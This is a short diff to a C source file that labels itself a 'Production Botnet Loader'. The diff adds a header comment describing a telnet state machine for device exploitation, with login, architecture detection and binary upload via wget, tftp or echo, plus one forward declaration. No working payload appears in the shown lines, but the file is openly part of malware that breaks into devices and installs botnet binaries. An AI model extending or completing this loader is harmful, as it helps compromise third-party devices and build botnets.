@@ -1,11 +1,19 @@
 /*
  * Production Botnet Loader - Connection Handling
+ * ============================================================================
+ * Manages telnet connection state machine for device exploitation
+ * Handles: IAC negotiation, login, architecture detection, binary upload
+ * Supports multiple upload methods: wget, tftp, echo
+ * ============================================================================
  */
 
 #include "includes.h"
 #include "connection.h"
 #include "binary.h"
 #include "util.h"
+
+/* Forward declarations */
+void connection_consume_prompt(struct connection *conn);
 
 /* Connection state machine handler */
 void connection_handler(struct connection *conn) {
